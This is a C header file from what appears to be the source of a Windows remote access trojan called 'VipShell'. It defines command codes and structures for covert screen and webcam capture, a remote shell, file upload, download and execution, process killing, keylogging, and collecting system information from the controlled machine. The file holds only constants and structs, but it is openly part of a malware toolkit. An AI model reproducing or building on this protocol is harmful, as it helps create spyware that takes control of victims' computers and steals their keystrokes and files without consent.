#pragma once
#include <windows.h>
#define CMD_GETDOWORK 0   //要求Server发送连 
//接的目的 返回 0 第一次连接 1 发送屏幕信息 2 连接发视频信息用 3 发送SHELL  4 FileManage  5 键盘记录
#define CMD_GETSCREEN 1   //发送屏幕
#define CMD_BUFLEN    2   //缓冲区长度
#define CMD_ISOK      3   //OK
#define CMD_GETCAP    4   //获取视频
#define CMD_ERROR     5   //出错
#define CMD_GETSHELL  6   //获取shell
#define CMD_GETFILEMANAGE    7   //FileManage
#define CMD_GETSYSTEMINFO   8   //系统信息(连接使用)
#define CMD_KEYDOWN 9      //WM_KEYDOWN 
#define CMD_KEYUP   10       //WM_KEYUP
#define CMD_MOUSEMOVE  11       //MOUSEMOVE
#define CMD_LBUTTONDOWN  12       //LBUTTONDOWN
#define CMD_LBUTTONUP   13       //LBUTTONUP
#define CMD_LBUTTONDBLCLK 14
#define CMD_RBUTTONDOWN 15        
#define CMD_RBUTTONUP   16
#define CMD_RBUTTONDBLCLK 17
#define CMD_KEYCTRLALTDEL 18    // Ctrl + Alt + del 

#define FILE_GETROOT		2049             //返回我的电脑
#define FILE_GETFILEPATH    2050             //返回返回指定目录的文件
#define FILE_DELETEFILE     2051             //返回删除文件
#define FILE_RUNFILE        2052             //返回运行文件
#define FILE_MOVEFILE       2053             //返回重命名文件
#define FILE_DWONFILE       2054             //下载文件
#define FILE_UPFILE         2055             //上传文件
#define FILE_CREATEDIR      2056             //创建文件夹

#define CMD_GETPROCESSLIST  2057             //进程列表
#define CMD_KILLPROCESS     2058             //结束进程
#define CMD_GETKEYLOG       2059             //开始键盘记录

#define CMD_DOWNFILERUN     2060             //下载文件并且运行
#define CMD_SETCONFIG       2061             //更改配置文件信息



struct tagVipShellCmd
{
	DWORD dwCmd;
	DWORD dw1;
	DWORD dw2;
	DWORD dw3;
	BYTE pBuff[256  * 2 ];
};

#define DEF_CMDTYPE_CmdTypeDWORD  0   // 


/******SYSTEMINFO****/
struct tagServerSystemInfo
{
	WCHAR szExplain[100];    //注释
	WCHAR szName[100];       //机器名
	DWORD dwPlatformId;      //系统版本相关
	DWORD dwMajorVersion;    //系统版本相关
	DWORD dwMinorVersion;    //系统版本相关
	DWORD dwCpuSpeed;        //cpu速度
	DWORD dwMemory;          //内存大小
	bool bIsCanCap;          
};

/*****************************/
//文件传输用的结构体
struct structFileInfo {
	WCHAR szName[5];
	DWORD dwType;
	DWORD dwBig;
	ULONGLONG ulltotalspace;
	ULONGLONG ullfreespace;
	ULONGLONG ullcanusebyte;
};
struct tagVipShellFileInfo
{
	WCHAR cFileName[MAX_PATH];
	DWORD dwFileSize;
	FILETIME ftLastWriteTime;
	bool bIsDir;
};

struct tagVipShellProcess
{
	DWORD dwPid;
	WCHAR cFileName[MAX_PATH];
};
